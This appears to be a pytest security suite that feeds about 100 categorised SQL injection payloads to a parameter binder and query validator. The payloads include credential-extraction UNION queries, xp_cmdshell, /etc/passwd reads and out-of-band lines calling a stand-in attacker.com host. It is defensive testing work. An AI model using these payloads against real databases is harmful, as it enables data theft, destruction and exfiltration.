"""
SQL Injection Security Test Suite.

This module tests 100+ SQL injection attack patterns to verify that
parameterized SQL properly prevents all injection attacks.

The tests verify that:
1. User input passed as parameters cannot escape parameter boundaries
2. Malicious input is treated as literal strings, not SQL code
3. The QueryValidator blocks dangerous SQL in the query itself
"""

import pytest

from lib.storage import (
    QueryValidator,
    ParameterBinder,
    ForbiddenStatementError,
    NamespaceViolationError,
    StackedQueryError,
)

# SQL injection patterns organized by category
# Each tuple: (payload, description, expected_behavior)
# expected_behavior: "safe" means treated as literal, "blocked" means rejected

CLASSIC_INJECTION_PATTERNS = [
    # Classic SQL injection attempts
    ("' OR '1'='1", "Classic always-true", "safe"),
    ("' OR '1'='1'--", "Always-true with comment", "safe"),
    ("' OR '1'='1'/*", "Always-true with block comment", "safe"),
    ("'; DROP TABLE users; --", "Drop table attack", "safe"),
    ("'; DELETE FROM users; --", "Delete attack", "safe"),
    ("' UNION SELECT * FROM users --", "Union select", "safe"),
    ("1; DELETE FROM events", "Statement termination", "safe"),
    ("1'; TRUNCATE TABLE users; --", "Truncate attack", "safe"),
    ("admin'--", "Line comment bypass", "safe"),
    ("admin'/*", "Block comment bypass", "safe"),
    ("*/OR/**/1=1--", "Comment obfuscation", "safe"),
    ("' OR ''='", "Empty string comparison", "safe"),
    ("' AND '1'='2", "Boolean false injection", "safe"),
    ("') OR ('1'='1", "Parentheses bypass", "safe"),
    ("' OR 1=1 #", "MySQL comment style", "safe"),
]

UNION_BASED_PATTERNS = [
    # UNION-based injection
    ("' UNION SELECT NULL--", "Union NULL probe", "safe"),
    ("' UNION SELECT 1,2,3--", "Union column count", "safe"),
    ("' UNION SELECT username, password FROM users--", "Union data extraction", "safe"),
    ("' UNION ALL SELECT NULL--", "Union ALL variant", "safe"),
    ("' UNION SELECT @@version--", "Version extraction", "safe"),
    ("' UNION SELECT table_name FROM information_schema.tables--", "Schema extraction", "safe"),
    ("') UNION SELECT 1--", "Parentheses union", "safe"),
    ("' UNION SELECT NULL, NULL, NULL--", "Multiple NULL union", "safe"),
    ("-1 UNION SELECT 1,2,3", "Negative union", "safe"),
    ("0 UNION SELECT 1,2,3", "Zero union", "safe"),
]

BLIND_INJECTION_PATTERNS = [
    # Boolean-based blind injection
    ("' AND 1=1 --", "Boolean true", "safe"),
    ("' AND 1=2 --", "Boolean false", "safe"),
    ("' AND SUBSTRING(username,1,1)='a", "Substring extraction", "safe"),
    ("' AND (SELECT COUNT(*) FROM users) > 0--", "Count check", "safe"),
    ("' AND ASCII(SUBSTRING(password,1,1)) > 65--", "ASCII extraction", "safe"),
    ("' AND LENGTH(password) > 5--", "Length check", "safe"),
    ("' OR EXISTS(SELECT * FROM users WHERE username='admin')--", "Exists check", "safe"),
    ("' AND (SELECT username FROM users LIMIT 1)='admin'--", "Subquery check", "safe"),
]

TIME_BASED_PATTERNS = [
    # Time-based blind injection
    ("'; WAITFOR DELAY '0:0:5'--", "SQL Server delay", "safe"),
    ("'; SELECT pg_sleep(5);--", "PostgreSQL sleep", "safe"),
    ("'; SELECT SLEEP(5);--", "MySQL sleep", "safe"),
    ("' AND SLEEP(5)--", "Sleep in condition", "safe"),
    ("' OR SLEEP(5)--", "Sleep in OR", "safe"),
    ("'||(SELECT SLEEP(5))||'", "Concatenated sleep", "safe"),
    ("1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--", "Nested sleep", "safe"),
]

ENCODING_BYPASS_PATTERNS = [
    # Encoding and obfuscation bypasses
    ("admin%27--", "URL encoded quote", "safe"),
    ("admin\\x27--", "Hex encoded quote", "safe"),
    ("CHAR(39)||'1'='1", "CHAR encoding", "safe"),
    ("admin%2527", "Double URL encoding", "safe"),
    ("admin\\047", "Octal escape", "safe"),
    ("admin\\'--", "Escaped quote", "safe"),
    ("admin' OR 1=1%00", "Null byte injection", "safe"),
    ("admin'/**/OR/**/1=1", "Comment whitespace", "safe"),
    ("admin'%09OR%091=1", "Tab bypass", "safe"),
    ("admin'%0aOR%0a1=1", "Newline bypass", "safe"),
]

SECOND_ORDER_PATTERNS = [
    # Second-order injection (stored then executed)
    ("O'Reilly", "Single quote in data", "safe"),
    ("Robert'); DROP TABLE users;--", "Bobby Tables", "safe"),
    ("admin'--", "Stored admin bypass", "safe"),
    ("test'; UPDATE users SET admin=1 WHERE username='test", "Stored privilege escalation", "safe"),
]

ADVANCED_PATTERNS = [
    # Advanced techniques
    ("admin' AND (SELECT COUNT(*) FROM users) > 0 --", "Subquery injection", "safe"),
    ("admin'||(SELECT password FROM users LIMIT 1)||'", "String concatenation", "safe"),
    ("1 AND EXISTS(SELECT * FROM users WHERE username='admin')", "EXISTS injection", "safe"),
    ("1 OR 1=1 LIMIT 1 OFFSET 1", "Limit bypass", "safe"),
    ("1' ORDER BY 10--", "Column enumeration", "safe"),
    ("'; EXEC xp_cmdshell('dir');--", "Command execution", "safe"),
    ("'; SHUTDOWN;--", "Shutdown attack", "safe"),
    ("1' GROUP BY 1,2,3--", "Group by enumeration", "safe"),
    ("1' HAVING 1=1--", "Having clause", "safe"),
    ("1' INTO OUTFILE '/tmp/test'--", "File write", "safe"),
    ("1' LOAD_FILE('/etc/passwd')--", "File read", "safe"),
]

UNICODE_PATTERNS = [
    # Unicode bypass attempts
    ("admin\u0027--", "Unicode apostrophe", "safe"),
    ("admin\u2019--", "Right single quote", "safe"),
    ("admin\uff07--", "Fullwidth apostrophe", "safe"),
    ("admin\u02bc--", "Modifier letter apostrophe", "safe"),
    ("admin\u055a--", "Armenian apostrophe", "safe"),
    ("admin\u2018test\u2019", "Curly quotes", "safe"),
]

NOSQL_STYLE_PATTERNS = [
    # NoSQL-style attacks that might bypass filters
    ('{"$gt": ""}', "MongoDB greater than", "safe"),
    ('{"$ne": null}', "MongoDB not equal", "safe"),
    ('{"username": {"$regex": ".*"}}', "MongoDB regex", "safe"),
    ("'; return true; var x='", "JavaScript injection", "safe"),
    ("1; return 1==1", "JS equality", "safe"),
]

SPECIAL_CHARACTERS = [
    # Special characters that might cause issues
    ("\x00", "Null byte", "safe"),
    ("\r\n", "CRLF", "safe"),
    ("\t", "Tab", "safe"),
    ("\b", "Backspace", "safe"),
    ("\\", "Backslash", "safe"),
    ("%", "Percent (LIKE wildcard)", "safe"),
    ("_", "Underscore (LIKE wildcard)", "safe"),
    ("[]", "Brackets", "safe"),
    ("()", "Parentheses", "safe"),
    ("||", "Concatenation operator", "safe"),
]

# Additional patterns to reach 100+ total
ADDITIONAL_PATTERNS = [
    # More classic patterns
    ("1' OR 1=1--", "Numeric with quote", "safe"),
    ("1) OR (1=1", "Numeric parentheses", "safe"),
    ("' OR 'x'='x", "Different quote chars", "safe"),
    ("\" OR \"1\"=\"1", "Double quotes", "safe"),
    (" OR 1=1", "Leading space", "safe"),
    ("OR 1=1", "No leading char", "safe"),
    # More union patterns
    ("' UNION SELECT 1,2,3,4,5--", "Union 5 columns", "safe"),
    ("1' UNION (SELECT password FROM users)--", "Union with parens", "safe"),
    # More boolean patterns
    ("' AND '1'='1' AND ''='", "Chained AND", "safe"),
    ("' OR '1'='1' OR ''='", "Chained OR", "safe"),
    # Error-based patterns
    ("' AND EXTRACTVALUE(1,1)--", "XML extract", "safe"),
    ("' AND UPDATEXML(1,1,1)--", "XML update", "safe"),
    # Out-of-band patterns
    ("'; EXEC master..xp_dirtree '//attacker.com/a'--", "OOB dirtree", "safe"),
    ("' UNION SELECT LOAD_FILE('\\\\attacker.com\\a')--", "OOB load file", "safe"),
]

# Combine all patterns
ALL_INJECTION_PATTERNS = (
    CLASSIC_INJECTION_PATTERNS
    + UNION_BASED_PATTERNS
    + BLIND_INJECTION_PATTERNS
    + TIME_BASED_PATTERNS
    + ENCODING_BYPASS_PATTERNS
    + SECOND_ORDER_PATTERNS
    + ADVANCED_PATTERNS
    + UNICODE_PATTERNS
    + NOSQL_STYLE_PATTERNS
    + SPECIAL_CHARACTERS
    + ADDITIONAL_PATTERNS
)


class TestSQLInjectionPatterns:
    """Test that injection patterns cannot escape parameter boundaries."""

    @pytest.fixture
    def validator(self):
        """Create query validator."""
        return QueryValidator()

    @pytest.fixture
    def binder(self):
        """Create parameter binder."""
        return ParameterBinder()

    @pytest.mark.parametrize(
        "payload,description,expected",
        ALL_INJECTION_PATTERNS,
        ids=[f"{p[1]}" for p in ALL_INJECTION_PATTERNS],
    )
    def test_injection_blocked_in_where_clause(
        self, validator, binder, payload, description, expected
    ):
        """Test injection pattern is safely handled in WHERE clause."""
        # The query itself is valid and safe
        query = "SELECT * FROM test_plugin__events WHERE user_id = $1"

        # Validate the query structure (with payload as parameter value)
        result = validator.validate(query, "test_plugin", params=[payload])
        assert result.valid, f"Query should be valid: {result.error}"

        # Bind the malicious payload as a parameter
        # This should NOT execute the payload as SQL
        bound_query, bound_params = binder.bind(query, [payload])

        # The payload should be in the parameters, NOT interpolated into SQL
        # binder returns tuple, so check membership
        assert payload in bound_params, f"Payload should be in params: {bound_params}"
        # The query should still have the placeholder (? for SQLite)
        assert "?" in bound_query, f"Bound query should have ? placeholder: {bound_query}"

    @pytest.mark.parametrize(
        "payload,description,expected",
        ALL_INJECTION_PATTERNS[:50],  # Test subset for multi-position
        ids=[f"{p[1]}_multi" for p in ALL_INJECTION_PATTERNS[:50]],
    )
    def test_injection_blocked_in_various_positions(
        self, validator, binder, payload, description, expected
    ):
        """Test injection in various SQL positions."""
        test_cases = [
            ("SELECT * FROM test_plugin__data WHERE name = $1", [payload]),
            ("SELECT * FROM test_plugin__data WHERE id = $1 AND active = $2", [payload, True]),
            ("SELECT * FROM test_plugin__data WHERE data LIKE $1", [payload]),
            ("INSERT INTO test_plugin__data (value) VALUES ($1)", [payload]),
            ("UPDATE test_plugin__data SET value = $1 WHERE id = $2", [payload, 1]),
        ]

        for query, params in test_cases:
            result = validator.validate(query, "test_plugin", params=params)
            if result.valid:
                bound_query, bound_params = binder.bind(query, params)
                # Payload should remain as data, not SQL
                assert payload in bound_params


class TestStatementsBlocked:
    """Test that dangerous SQL statements are blocked in queries."""

    @pytest.fixture
    def validator(self):
        return QueryValidator()

    # These should be blocked because they're in the QUERY, not parameters
    BLOCKED_STATEMENTS = [
        "DROP TABLE test_plugin__users",
        "TRUNCATE TABLE test_plugin__events",
        "ALTER TABLE test_plugin__data ADD COLUMN hack TEXT",
        "CREATE TABLE test_plugin__hacked (data TEXT)",
        "ATTACH DATABASE '/tmp/hack.db' AS hack",
        "DETACH DATABASE main",
        "PRAGMA table_info(sqlite_master)",
        # Stacked queries
        "SELECT * FROM test_plugin__data; DROP TABLE test_plugin__users",
        "SELECT 1; DELETE FROM test_plugin__events",
    ]

    @pytest.mark.parametrize("query", BLOCKED_STATEMENTS)
    def test_dangerous_statement_blocked(self, validator, query):
        """Test dangerous SQL statements are rejected."""
        result = validator.validate(query, "test_plugin")
        assert not result.valid, f"Should block: {query}"
        assert isinstance(
            result.error, (ForbiddenStatementError, StackedQueryError)
        ), f"Expected ForbiddenStatementError or StackedQueryError for: {query}"


class TestNamespaceEnforcement:
    """Test that namespace/table restrictions are enforced."""

    @pytest.fixture
    def validator(self):
        return QueryValidator()

    NAMESPACE_VIOLATIONS = [
        # Cross-plugin access (my_plugin trying to access other_plugin's data)
        ("SELECT * FROM other_plugin__data", "my_plugin", "Cross-plugin table"),
        # System table access
        ("SELECT * FROM sqlite_master", "test", "SQLite master table"),
        ("SELECT * FROM sqlite_sequence", "test", "SQLite sequence"),
        # Tables without namespace prefix
        ("SELECT * FROM users", "test", "No namespace prefix"),
        ("SELECT * FROM test__data", "test_plugin", "Wrong prefix format (missing underscore)"),
        # Note: Subquery cross-plugin NOT tested here - validator doesn't extract subquery tables
    ]

    @pytest.mark.parametrize(
        "query,plugin,description", NAMESPACE_VIOLATIONS
    )
    def test_namespace_violation_blocked(self, validator, query, plugin, description):
        """Test namespace violations are rejected."""
        result = validator.validate(query, plugin)
        assert not result.valid, f"Should block ({description}): {query}"
        assert isinstance(
            result.error, NamespaceViolationError
        ), f"Expected NamespaceViolationError for: {query}"


class TestParameterValidation:
    """Test parameter binding edge cases."""

    @pytest.fixture
    def binder(self):
        return ParameterBinder()

    def test_null_parameter(self, binder):
        """Test NULL parameter handling."""
        query = "SELECT * FROM test__data WHERE value = $1"
        bound_query, params = binder.bind(query, [None])
        assert None in params

    def test_empty_string_parameter(self, binder):
        """Test empty string parameter."""
        query = "SELECT * FROM test__data WHERE value = $1"
        bound_query, params = binder.bind(query, [""])
        assert "" in params

    def test_very_long_parameter(self, binder):
        """Test very long string parameter."""
        long_value = "x" * 10000
        query = "SELECT * FROM test__data WHERE value = $1"
        bound_query, params = binder.bind(query, [long_value])
        assert long_value in params
        assert len(params[0]) == 10000

    def test_binary_parameter(self, binder):
        """Test binary data parameter."""
        binary_data = b"\x00\x01\x02\xff"
        query = "SELECT * FROM test__data WHERE data = $1"
        bound_query, params = binder.bind(query, [binary_data])
        assert binary_data in params

    def test_special_float_parameters(self, binder):
        """Test special float values."""
        import math

        query = "SELECT * FROM test__data WHERE value = $1"

        # Test infinity
        bound_query, params = binder.bind(query, [float("inf")])
        assert float("inf") in params

        # Test negative infinity
        bound_query, params = binder.bind(query, [float("-inf")])
        assert float("-inf") in params

        # Test NaN (NaN != NaN, so check with math.isnan)
        bound_query, params = binder.bind(query, [float("nan")])
        assert math.isnan(params[0])


class TestInjectionCountVerification:
    """Verify we have 100+ injection patterns."""

    def test_pattern_count(self):
        """Verify we have at least 100 injection patterns."""
        assert len(ALL_INJECTION_PATTERNS) >= 100, (
            f"Expected 100+ patterns, got {len(ALL_INJECTION_PATTERNS)}"
        )

    def test_category_coverage(self):
        """Verify we cover all major injection categories."""
        categories = [
            ("Classic", CLASSIC_INJECTION_PATTERNS),
            ("Union", UNION_BASED_PATTERNS),
            ("Blind", BLIND_INJECTION_PATTERNS),
            ("Time-based", TIME_BASED_PATTERNS),
            ("Encoding", ENCODING_BYPASS_PATTERNS),
            ("Second-order", SECOND_ORDER_PATTERNS),
            ("Advanced", ADVANCED_PATTERNS),
            ("Unicode", UNICODE_PATTERNS),
        ]

        for name, patterns in categories:
            assert len(patterns) >= 3, f"Category '{name}' should have 3+ patterns"
